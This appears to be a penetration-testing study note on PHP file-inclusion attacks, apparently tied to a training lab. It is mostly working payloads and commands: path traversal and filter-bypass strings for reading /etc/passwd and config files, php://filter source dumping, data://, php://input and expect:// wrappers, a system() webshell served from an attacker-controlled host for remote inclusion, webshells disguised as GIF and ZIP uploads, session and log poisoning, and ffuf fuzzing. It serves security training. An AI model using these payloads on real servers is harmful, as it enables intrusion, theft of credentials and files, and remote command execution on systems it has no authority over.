# Local File Inclusions (LFI)

If a query param reads a file we can sometimes manipulate the input to read other files:
```
http://94.237.58.137:53039/index.php?language=../../../../../etc/passwd
```

Sometimes very simple filters exist which remove this form of path traversal by removing the occurence of `../` to an empty string.. We can bypass this by injecting: `....//` insted which when filtered returns `../`

Other options are: `..././`, `....\/`, `....\/`, `....////`

Sometimes performing url encoding before sending the payload also bypasses some filters.

## Filtering appended extensions
In old php versions there was a max parameter length of 4096 chars.. everything more would be truncated meaning we can modify our string to exceed this length and it will cut of the `.php` or other extensions

Another way is using null bytes which indicate the end of a string in low level languages such as C and C++... by adding this null byte the part after it is not considered anymore:
```
/etc/passwd%00.php
```

In the below example we combine a filter for:
- Path to contain the `languages`
- `../` is filtered away to an empty string

## Dumping php source code

Sometimes when passing the location of a php file in a query parameter, the php content gets executed rather then returned. We can avoid this behaviour through the use of filters:
```
php://filter/read=convert.base64-encode/resource=config
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
```

## Getting remote code execution

Sometimes on a php server we can get remote code execution through use of the `data` wrapper.
With the data wrapper data is handles as a virtual file. Some examples:
```
data://text/plain,HelloWorld
data://text/plain;base64,SGVsbG9Xb3JsZA==
```
So if the application parses unsafe input and uses it in an `include`, like for instance here:
```
<?php
// index.php
$page = $_GET['page'] ?? 'home.php';
include($page);
```

We can make it run code by injecting this as the `home` query param:
```
data://text/plain,<?php system($_GET["cmd"]); ?>
```
Or base64 encoded:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```
In one go we can also then run a command injection like this:
```
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```
This only works if the `allow_url_include` config is set to `On` in the servers configuration.

We can do something similar with the `input` wrapper which reads data from the body of a POST message.

```
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

The most simple one is the `expect` wrapper which just runs whatever we give it:
```
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```
However this wrapper is a plugin and needs to be installed.

## Remote file inclusion

We can apply the same techniques but host the payload on a server we control:
Let's host this shells script on a python http server:
```
<?php system($_GET["cmd"]); ?>
```
Host it via python:
```
sudo python3 -m http.server 8080
```

Inject the RFI:
```
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

We can do the same with ftp:
On the attack box:
```
sudo python -m pyftpdlib -p 21
```
Then inject the LFI in the url:
```
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```

# RCE through uploading a file

We can create a gif image which contains a webshell:
```
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
We then upload the webshell, typically we can figure out the directory where it is stored..
Then if the site is vunerable to an LFI exploit we can trigger execution of the script:
```
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

We can also upload a picture which is actually a zip file and try using the zip wrapper:
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```
Then exploit the LFI vunerability:
```
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

## PHP Session Poisoning

The session cookies are stored on the backend too remember stuff as user preferences and so on.. we can poison the cookie with a webshell and then use the LFI exploit to run the poised log..

Doing this writes a webshell to the session cookie stored on the backend
```
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

We can then exploit it:
```
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```
Where sess_nhhv8i0o6ua4g88bkdl9u1fdsd is the folder for our session cookie in this case.


## Server log poisoning

We can poison the log of an Apache server by modifying the user-agent:
```
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```
Now there is a php webshell in the log file.
We can run the webshell with:
```
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
```

## Automated scanning

Fuzzing for query parameters we can then test for LFI exploits:

```
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```

Then fuzz for LFI exploits:
```
ffuf -w /snap/seclists/current/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```

Fuzzing for the web root directory:
```
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```

Fuzzing for the server web root for config files:
```
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
```
Dedicated word lists can be found here:
https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows

When found we can read the config file through the LFI exploit:
```
curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
```

